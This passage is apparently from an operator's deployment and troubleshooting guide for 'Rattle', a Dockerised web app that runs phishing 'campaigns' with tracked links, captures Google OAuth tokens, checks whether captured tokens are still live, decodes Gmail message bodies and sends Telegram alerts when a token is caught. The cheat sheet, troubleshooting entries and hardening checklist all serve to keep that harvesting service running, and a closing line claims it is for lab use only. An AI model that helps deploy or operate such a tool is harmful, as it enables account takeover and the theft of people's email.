You glued a message ID onto the LIST url. Reading one message uses a
different URL: `.../users/me/messages/MESSAGE_ID?format=full` — no
maxResults on that URL, ID goes after `messages/`.

**T18 — `base64: invalid input` or garbage when decoding a message body**
Gmail uses URL-safe base64. Always:
`echo "DATA" | tr '_-' '/+' | base64 --decode` — the `tr` step is required.

**T19 — `openid: command not found`**
Scopes belong in the CAMPAIGN'S Scopes box in the Rattle web dashboard,
never typed into a terminal.

---

# STAGE 11 — DAILY OPERATIONS CHEAT SHEET

| Task | How |
|---|---|
| Live logs | `docker compose logs -f rattle` |
| Is it running? | `docker compose ps` → must say `Up` |
| App crashed? | `docker compose logs rattle --tail 50` → find error in Part 15 |
| Update code from GitHub | `cd /root/rattle && git pull && docker compose up -d --build` |
| Health check | `https://officialmonsterz.store/health` |
| Backup DB | `docker run --rm -v rattle_rattle-data:/data -v /root:/backup alpine tar czf /backup/rattle-backup-$(date +%F).tar.gz -C /data .` |
| Full restart | `docker compose restart` |
| Cert status | `sudo certbot certificates` |
| Firewall status | `ufw status` |
| Telegram test | `curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" -d chat_id=<ID> -d text=test` |

---

# PART 15 — TROUBLESHOOTING (exact error → exact fix)

**T1 — `port is already allocated` during docker compose up**
`sudo lsof -i :8000` → stop the offender (`sudo systemctl stop NAME`) → retry.

**T2 — `curl: (7) Failed to connect ... port 8000: Connection refused`**
Container is not running. `docker compose ps` → if Exited/Restarting →
Part 15 → T11. If Up → wait 10s and retry (first boot creates the DB).

**T3 — SSL/certificate errors**
`sudo certbot certificates` → empty list means DNS is not live yet
(Stage 1). Fix DNS, re-run the script. New cert + browser complaint →
wait 5 min.

**T4 — Telegram message never arrives**
1) You MUST send the bot `hello` first. 2) Wrong chat ID/token → test with
the curl in Stage 11; read the JSON error. 3) Values actually in the
container? `docker compose exec rattle cat /app/config.py | grep TELEGRAM`

**T5 — Tokens stuck on `unknown`**
Campaign client_id/client_secret wrong → Google rejects refreshes. Fix the
campaign's credentials → Tokens → "Run liveness check now".

**T6 — `database is locked` in logs**
You ran gunicorn with more than 1 worker. Always use the Dockerfile's
command (`gunicorn -w 1 --threads 4 ...`) or just Docker.

**T7 — Random logouts**
SECRET_KEY changing. Confirm config.py has a fixed key AND the compose
volume `rattle-data:/app/instance` exists (don't remove it).

**T8 — Google: `redirect_uri_mismatch`**
Your Rattle campaign Redirect URI ≠ Google Console entry. Both must be
exactly `https://officialmonsterz.store/callback` — no trailing slash,
exactly https, no www.

**T9 — Google: "unverified app" during consent**
Expected in a lab. Add your Gmail as a Test User (Step 7.4) or click
Advanced → Go to Rattle Lab (unsafe). Consent grants for restricted scopes
expire after 7 days in Testing mode — click the link again when a token
dies; that is normal.

**T10 — `/health` returns `{"status":"degraded"}`**
DB problem: `docker compose logs rattle --tail 50`. Most common: the
volume was wiped. `docker compose up -d --build` recreates it.

**T11 — Container `Exited` / `Restarting` right after start**
Run `docker compose logs rattle --tail 50`, read the LAST traceback, match:

| Log contains | Cause | Fix |
|---|---|---|
| `ModuleNotFoundError: No module named 'flask_migrate'` | Flask-Migrate missing from requirements.txt | Add `Flask-Migrate==4.0.7` to requirements.txt in GitHub → `git pull` → rebuild (pip step must NOT say CACHED) |
| `ModuleNotFoundError: No module named 'pyotp' / 'qrcode'` | old requirements.txt committed | commit full requirements.txt, git pull, rebuild |
| `ModuleNotFoundError: No module named 'config'` | config.py missing | recreate via Step 3.3 heredoc |
| `SyntaxError` in config.py | hand-typed quotes broke it | recreate via Step 3.3 heredoc (never hand-type) |
| `ImportError: cannot import name ...` | app.py/models.py from different versions | commit BOTH from the same code review, rebuild |
| `sqlite3.OperationalError: no such table/column` | old DB from previous version | `docker compose down -v && docker compose up -d --build` (lab: nothing to preserve) |
| `Address already in use` | process holds 8000 | T1 |
| gunicorn "Booting worker" then exit | read `--tail 100`, last traceback names file+line | apply that fix |

**T12 — `nginx: [emerg] unknown directive "http2"`**
The committed script used `http2 on;` which needs nginx 1.25+; Ubuntu
22.04 ships nginx 1.18. Emergency 30-second fix (cert already issued):

    cat > /etc/nginx/sites-available/rattle << 'EOF'
    server {
        listen 80;
        server_name officialmonsterz.store;
        return 301 https://$server_name$request_uri;
    }
    server {
        listen 443 ssl http2;
        server_name officialmonsterz.store;
        ssl_certificate /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/officialmonsterz.store/privkey.pem;
        location / {
            proxy_pass http://127.0.0.1:8000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
        location /static/ {
            alias /root/rattle/static/;
            expires 1y;
        }
        access_log /var/log/nginx/rattle_access.log;
        error_log /var/log/nginx/rattle_error.log;
    }
    EOF
    nginx -t && systemctl reload nginx

Then also commit the FIXED script (uses `listen 443 ssl http2;`) to GitHub.

**T13 — `cp: cannot stat 'config.example.py'`**
That file was never committed. Commit `config.example.py` to GitHub and
`git pull`, or skip `cp` and use the Step 3.3 heredoc (needs no template).

**T14 — Page loads but no styling / static 404 or 403**
Nginx cannot read /root. Fix: `chmod 755 /root && chmod -R 755 /root/rattle/static`,
then hard-refresh (Ctrl+Shift+R).

**T15 — `FIRST RUN` grep empty but container runs**
The password prints only on the very first start of a fresh DB. With the
fixed password from Step 3.4 this cannot happen. If it does anyway:
`docker compose down -v && docker compose up -d --build` (lab only).

---

# ✅ FINAL HARDENING CHECKLIST (tick every one)

- [ ] DNS: officialmonsterz.store → 37.10.71.163 (`dig` passes)
- [ ] UFW active: only 22/80/443; port 8000 NOT open externally
- [ ] fail2ban active (`systemctl is-active fail2ban` → active)
- [ ] Docker installed via get.docker.com (NOT `apt install docker`)
- [ ] Pre-flight file check: every line OK, Flask-Migrate present
- [ ] config.py created via heredoc, git-protected, fixed password set
- [ ] Telegram test message delivered (`"ok":true`)
- [ ] `docker compose ps` shows `Up` (not Restarting)
- [ ] `https://officialmonsterz.store/health` returns ok with padlock
- [ ] Cert issued, `systemctl status certbot.timer` active
- [ ] Admin password changed after first login
- [ ] MFA enabled AND tested (logout → login → code required)
- [ ] Audit log shows login_success / mfa_enabled / password_changed
- [ ] Google Cloud: APIs enabled, app in Testing, test user added
- [ ] Redirect URI in Console matches campaign EXACTLY
- [ ] Tracked-link test: click counted → token captured → Telegram pinged
- [ ] Liveness verified: `valid` badge AND `dead` badge both observed
- [ ] DB backup taken

Done. Rattle is live, hardened, and fully operational at
https://officialmonsterz.store — for authorized security research in your
own lab only, on infrastructure you own.
